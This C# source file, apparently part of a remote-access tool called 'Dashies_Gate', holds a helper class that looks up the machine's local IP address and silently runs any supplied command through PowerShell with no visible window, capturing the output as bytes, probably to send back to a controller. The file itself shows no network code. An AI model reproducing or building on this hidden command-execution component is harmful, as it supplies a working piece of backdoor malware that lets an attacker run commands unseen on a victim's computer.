
//Author: Dashie
//Version: 1.0

using System;
using System.Net;
using System.Text;
using System.Net.Sockets;
using System.Diagnostics;

namespace Dashies_Gate
{
    public static class Helper
    {
        public static string GetLocalIP()
        {
            Program.local_address = ($"null");

            var hostname = Dns.GetHostName();
            var host_addresses = Dns.GetHostEntry(hostname);

            foreach (var host_address in host_addresses.AddressList)
            {
                if (host_address.AddressFamily == AddressFamily.InterNetwork)
                {
                    Program.local_address = host_address.ToString();
                };
            };

            return Program.local_address;
        }

        private static string powershell_file = ($"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
        private static string argument_injection = ($"/c");
        private static string desktop_path = ($"C:\\Users\\{Environment.UserName}\\Desktop");

        public static byte[] System(string command)
        {
            byte[] return_buffer = (null);

            try
            {
                argument_injection = ($"/c {command}");

                Process process = new Process()
                {
                    StartInfo = new ProcessStartInfo(powershell_file)
                    {
                        WorkingDirectory = ($"{desktop_path}"),
                        Arguments = argument_injection,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        RedirectStandardInput = true,
                        UseShellExecute = false,
                        CreateNoWindow = true,
                    },
                };

                process.Start();

                string standard_value = ($"[INFO]: Command has been executed!"); ;
                string store_buffer = standard_value;

                while (!process.StandardOutput.EndOfStream)
                {
                    store_buffer += process.StandardOutput.ReadLine() + "\r\n";
                };

                if (store_buffer != standard_value)
                {
                    return_buffer = Encoding.ASCII.GetBytes(store_buffer);
                };
            }

            catch (Exception e)
            {
                return_buffer = Encoding.ASCII.GetBytes(e.ToString());
            };

            return return_buffer;
        }
    }
}
